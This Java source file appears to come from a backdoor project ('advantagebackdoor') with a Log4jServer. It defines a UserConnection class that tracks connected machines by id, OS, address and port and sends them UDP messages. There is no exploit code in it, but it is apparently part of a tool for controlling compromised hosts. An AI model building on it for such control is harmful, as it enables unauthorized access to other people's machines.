package me.faintcloudy.advantagebackdoor.api.connection;

import com.alibaba.fastjson.JSON;
import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.message.NetworkMessage;

import java.io.IOException;
import java.net.*;
import java.util.Date;
import java.util.Objects;

public class UserConnection {
    int id;
    String os;
    InetAddress address;
    int port;
    long lastMessageTime = -1;

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getOS() {
        return os;
    }

    public void setOS(String os) {
        this.os = os;
    }

    public UserConnection(InetAddress address, int port, int id)
    {
        this.id = id;
        this.address = address;
        this.port = port;
    }

    public int getPort() {
        return port;
    }

    public InetAddress getAddress() {
        return address;
    }

    public void sendMessage(NetworkMessage message) {
        try {
            byte[] bytes = message.serialize();
            Log4jServer.getInstance().getSocket().send(new DatagramPacket(bytes, bytes.length, address, port));
        } catch (IOException e) {
            System.out.println("发送信息 " + JSON.toJSONString(message) + " 时发生错误: ");
            e.printStackTrace();
        }
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        UserConnection that = (UserConnection) o;
        return address == that.address && port == that.port;
    }

    @Override
    public int hashCode() {
        return Objects.hash(id, os, address, port);
    }

    @Override
    public String toString() {
        return id + "号 (" + address.toString() + ":" + port + ":" + os + ")";
    }

    public boolean isOnline()
    {
        if (lastMessageTime == -1)
            return false;
        return new Date(System.currentTimeMillis() - lastMessageTime).getSeconds() < 5;
    }

    public void setLastMessageTime(long lastMessageTime) {
        this.lastMessageTime = lastMessageTime;
    }

    public long getLastMessageTime() {
        return lastMessageTime;
    }
}
